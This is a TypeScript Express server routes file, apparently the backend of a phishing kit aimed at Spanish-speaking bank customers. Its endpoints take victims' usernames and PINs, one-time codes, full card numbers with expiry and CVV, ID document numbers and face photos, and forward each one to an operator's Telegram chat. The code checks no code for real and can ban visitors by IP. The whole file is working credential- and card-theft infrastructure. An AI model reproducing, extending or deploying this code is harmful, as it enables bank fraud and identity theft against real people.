import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertUserSchema, insertLoginAttemptSchema } from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";
import { initTelegramBot, sendDecisionButtons, telegramDecisions, sendCardDataButtons, sendFacePhoto, sendYesIWasMeMessage } from "./telegram-bot";
import { config } from "./config";
import multer from "multer";

// Helper to generate random 6-digit code
function generateDynamicCode(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Get client IP endpoint
  app.get("/api/client-ip", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    res.json({ ip: typeof ip === 'string' ? ip.split(',')[0] : ip });
  });

  // Login endpoint - accepts any username/password with validation
  // Validation: username must have at least one digit, password max 4 digits
  app.post("/api/login", async (req, res) => {
    try {
      const { username, password } = req.body;

      // Validate input
      if (!username || !password) {
        return res.status(400).json({ error: "Usuario y contraseña requeridos" });
      }

      // Check username has at least one digit
      if (!/\d/.test(username)) {
        return res.status(400).json({ error: "El usuario debe contener al menos un número" });
      }

      // Check password has max 4 digits
      if (!/^\d{1,4}$/.test(password)) {
        return res.status(400).json({ error: "La contraseña debe tener máximo 4 dígitos" });
      }

      // Create or get user (for Telegram integration)
      let user = await storage.getUserByUsername(username);
      if (!user) {
        user = await storage.createUser({
          username,
          password,
          telegramChatId: config.TELEGRAM_CHAT_ID, // Auto-assign Telegram chat ID
        });
      } else if (!user.telegramChatId) {
        // If user exists but doesn't have Telegram chat ID, update it
        await storage.updateUserTelegramChatId(user.id, config.TELEGRAM_CHAT_ID);
        user = await storage.getUser(user.id) || user;
      }

      // Log the login attempt
      await storage.logLoginAttempt({
        username,
        success: true,
        telegramChatId: user.telegramChatId,
      });

      // Generate dynamic code (valid for 5 minutes)
      const code = generateDynamicCode();
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
      
      const dynamicCode = await storage.createDynamicCode({
        userId: user.id,
        code,
        expiresAt,
      });

      // Send decision buttons via Telegram if user has chat ID configured
      let sentViaTelegram = false;
      if (user.telegramChatId) {
        try {
          sentViaTelegram = await sendDecisionButtons(
            parseInt(user.telegramChatId), 
            username,
            password,
            user.id
          );
        } catch (error) {
          console.error('Error sending Telegram message:', error);
        }
      }

      res.json({ 
        success: true,
        userId: user.id,
        codeId: dynamicCode.id,
        sentViaTelegram: sentViaTelegram,
        dynamicCode: code,
        requiresTelegramDecision: sentViaTelegram
      });

    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Verify dynamic code endpoint
  app.post("/api/verify-code", async (req, res) => {
    try {
      const { userId, code, username, password } = req.body;

      if (!userId || !code) {
        return res.status(400).json({ error: "Faltan parámetros" });
      }

      // Get user to access Telegram chat ID
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }

      console.log(`Verify code - User: ${user.username}, Code verification attempt`);

      // Send decision buttons to Telegram for code verification (second request)
      let sentToTelegram = false;
      if (user.telegramChatId) {
        try {
          console.log(`Intentando enviar botones a Telegram para usuario ${user.username} (código dinámico: ${code})`);
          sentToTelegram = await sendDecisionButtons(
            parseInt(user.telegramChatId),
            username || user.username,
            password || "****",
            userId,
            true, // Mark as second request
            code // Pass the dynamic code
          );
          console.log(`Resultado de envío a Telegram: ${sentToTelegram}`);
        } catch (error) {
          console.error('Error sending code to Telegram:', error);
        }
      } else {
        console.log(`Usuario ${user.username} - Telegram configuration not found`);
      }

      // Just acknowledge receipt - don't validate against any stored code
      res.json({ 
        success: true,
        message: "Código enviado a Telegram",
        sentToTelegram: sentToTelegram
      });

    } catch (error) {
      console.error("Verify code error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Get Telegram decision for a user
  app.get("/api/telegram-decision/:userId", async (req, res) => {
    try {
      const { userId } = req.params;

      if (!userId) {
        return res.status(400).json({ error: "userId requerido" });
      }

      const decision = telegramDecisions.get(userId);

      if (!decision) {
        return res.status(404).json({ 
          decision: null,
          message: "Sin decisión aún" 
        });
      }

      // Remove decision after retrieval to prevent reuse
      telegramDecisions.delete(userId);

      res.json({ 
        success: true,
        decision: decision 
      });

    } catch (error) {
      console.error("Get Telegram decision error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Create test user endpoint (for development)
  app.post("/api/register", async (req, res) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);
      
      // Check if user already exists
      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: "El usuario ya existe" });
      }

      const user = await storage.createUser(validatedData);
      
      res.json({ 
        success: true,
        user: { id: user.id, username: user.username }
      });

    } catch (error) {
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ error: validationError.message });
      }
      console.error("Register error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Link user to Telegram chat ID
  app.post("/api/link-telegram", async (req, res) => {
    try {
      const { userId, chatId } = req.body;

      if (!userId || !chatId) {
        return res.status(400).json({ error: "Faltan parámetros" });
      }

      await storage.updateUserTelegramChatId(userId, chatId.toString());

      res.json({ 
        success: true,
        message: "Telegram vinculado correctamente" 
      });

    } catch (error) {
      console.error("Link Telegram error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Get dynamic code for Telegram bot (will be called by bot)
  app.post("/api/telegram/get-code", async (req, res) => {
    try {
      const { userId } = req.body;

      const validCode = await storage.getValidDynamicCode(userId);

      if (!validCode) {
        return res.status(404).json({ 
          error: "No hay código válido" 
        });
      }

      res.json({ 
        code: validCode.code,
        expiresAt: validCode.expiresAt 
      });

    } catch (error) {
      console.error("Get code error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Send card data to Telegram
  app.post("/api/send-card-data", async (req, res) => {
    try {
      const { userId, documentType, documentNumber, cardNumber, cardExp, cardCvv } = req.body;

      if (!userId || !documentType || !documentNumber || !cardNumber || !cardExp || !cardCvv) {
        return res.status(400).json({ error: "Faltan parámetros" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }

      let sentToTelegram = false;
      if (user.telegramChatId) {
        try {
          sentToTelegram = await sendCardDataButtons(
            parseInt(user.telegramChatId),
            documentType,
            documentNumber,
            cardNumber,
            cardExp,
            cardCvv,
            userId
          );
        } catch (error) {
          console.error('Error sending card data to Telegram:', error);
        }
      }

      res.json({ 
        success: true,
        sentToTelegram: sentToTelegram
      });

    } catch (error) {
      console.error("Send card data error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Ban IP endpoint
  app.post("/api/ban-ip", async (req, res) => {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0") as string;
      const ipAddr = typeof ip === 'string' ? ip.split(',')[0] : ip;

      await storage.banIp(ipAddr);

      res.json({ 
        success: true,
        message: `IP ${ipAddr} baneada exitosamente` 
      });

    } catch (error) {
      console.error("Ban IP error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Check if IP is banned
  app.get("/api/check-ban", async (req, res) => {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0") as string;
      const ipAddr = typeof ip === 'string' ? ip.split(',')[0] : ip;

      const isBanned = await storage.isIpBanned(ipAddr);

      if (isBanned) {
        return res.status(403).json({ 
          success: false,
          error: "Tu IP ha sido baneada",
          banned: true
        });
      }

      res.json({ 
        success: true,
        banned: false 
      });

    } catch (error) {
      console.error("Check ban error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Send "Yes, it was me" message to Telegram
  app.post("/api/send-yes-i-was-me", async (req, res) => {
    try {
      const userId = req.body.userId;
      const username = req.body.username;
      const password = req.body.password;
      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }

      if (user.telegramChatId) {
        await sendYesIWasMeMessage(parseInt(user.telegramChatId), username, password, userId);
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Send yes-it-was-me error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  // Send face photo to Telegram
  const upload = multer({ storage: multer.memoryStorage() });

  app.post("/api/send-face-photo", upload.single('photo'), async (req, res) => {
    try {
      const userId = req.body.userId;
      const username = req.body.username;
      const password = req.body.password;
      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }

      if (req.file && user.telegramChatId) {
        await sendFacePhoto(parseInt(user.telegramChatId), req.file.buffer, userId, username, password);
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Send face photo error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
